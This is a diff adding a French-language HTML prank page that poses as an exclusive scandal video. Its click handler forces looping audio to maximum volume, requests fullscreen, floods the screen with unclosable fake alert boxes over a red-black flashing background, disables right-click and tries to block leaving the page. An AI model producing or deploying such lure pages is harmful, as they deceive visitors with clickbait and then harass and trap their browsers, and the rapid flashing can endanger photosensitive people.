@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>VIDÉO EXCLUSIVE - SCANDALE DU JOUR</title>
+    <style>
+        body {
+            background-color: #1a1a1a;
+            color: white;
+            font-family: 'Helvetica', Arial, sans-serif;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            overflow: hidden;
+            text-align: center;
+        }
+
+        .video-container {
+            width: 90%;
+            max-width: 500px;
+            background-color: #000;
+            border-radius: 10px;
+            position: relative;
+            aspect-ratio: 16 / 9;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            cursor: pointer;
+        }
+
+        .play-button {
+            width: 80px;
+            height: 80px;
+            background: rgba(255, 0, 0, 0.9);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: transform 0.2s;
+        }
+
+        .play-button::after {
+            content: '';
+            display: block;
+            width: 0;
+            height: 0;
+            border-top: 15px solid transparent;
+            border-bottom: 15px solid transparent;
+            border-left: 25px solid white;
+            margin-left: 8px;
+        }
+
+        .video-container:hover .play-button {
+            transform: scale(1.1);
+        }
+
+        h1 {
+            font-size: 20px;
+            margin-top: 20px;
+            color: #ff0000;
+            text-transform: uppercase;
+            padding: 0 15px;
+        }
+
+        p {
+            font-size: 14px;
+            color: #bbb;
+            margin-top: 5px;
+        }
+
+        .stats {
+            font-size: 12px;
+            color: #666;
+            margin-top: 15px;
+        }
+    </style>
+</head>
+
+<body onclick="declencherLeMbosa()">
+
+    <div class="video-container">
+        <div class="play-button"></div>
+    </div>
+
+    <h1>⚠️ VIDÉO EXCLUSIVE : LE SCANDALE DU JOUR ⚠️</h1>
+    <p>La vidéo qui fait trembler les réseaux sociaux depuis ce matin...</p>
+
+    <div class="stats">
+        👁️ 452 839 vues • En direct • Il y a 14 minutes
+    </div>
+
+    <audio id="prankAudio" loop>
+        <source src="Kotazo.mp3" type="audio/mpeg">
+    </audio>
+
+    <script>
+        function declencherLeMbosa() {
+            var audio = document.getElementById("prankAudio");
+            audio.volume = 1.0;
+            audio.play().catch(e => console.log("Audio play failed:", e));
+
+            // S'assurer que le son reste à 100% et ne se met pas en pause
+            setInterval(function () {
+                if (audio.volume < 1.0) audio.volume = 1.0;
+                if (audio.paused) audio.play().catch(e => { });
+            }, 50);
+
+            // Bloquer l'écran (Plein écran)
+            if (document.documentElement.requestFullscreen) {
+                document.documentElement.requestFullscreen().catch(e => { });
+            } else if (document.documentElement.webkitRequestFullscreen) {
+                document.documentElement.webkitRequestFullscreen();
+            }
+
+            // Remplacer alert() par un spam d'alertes HTML sur la page pour NE PAS bloquer le son
+            document.body.innerHTML = "";
+            document.body.style.overflow = "hidden";
+            document.body.style.backgroundColor = "black";
+
+            // Spam infini de fausses fenêtres d'alerte
+            setInterval(function () {
+                // Clignotement de l'arrière-plan
+                document.body.style.backgroundColor = document.body.style.backgroundColor === "black" ? "red" : "black";
+
+                var div = document.createElement("div");
+                div.style.position = "absolute";
+                div.style.left = Math.random() * 80 + "vw";
+                div.style.top = Math.random() * 80 + "vh";
+                div.style.backgroundColor = "white";
+                div.style.color = "black";
+                div.style.border = "3px solid #ccc";
+                div.style.padding = "20px";
+                div.style.borderRadius = "5px";
+                div.style.boxShadow = "0 10px 25px rgba(0,0,0,0.8)";
+                div.style.fontWeight = "bold";
+                div.style.zIndex = Math.floor(Math.random() * 10000);
+                div.style.cursor = "not-allowed";
+                div.style.userSelect = "none";
+                div.innerHTML = "⚠️ KOTAZO !!! 🐟🐟🐟<br><br>Poisson d'avril ! Tu cherches quel dossier chaud ? 😂";
+
+                // Si on essaie de cliquer dessus pour fermer, rien ne se passe (ou on peut en spawn davantage)
+                div.onclick = function (e) {
+                    e.stopPropagation();
+                };
+
+                document.body.appendChild(div);
+            }, 100);
+
+            // Désactiver le clic droit
+            document.addEventListener('contextmenu', event => event.preventDefault());
+
+            // Tenter d'empêcher la fermeture
+            window.onbeforeunload = function () {
+                return "Impossible de fuir, le son est bloqué à fond !";
+            };
+        }
+    </script>
+</body>
+
+</html>
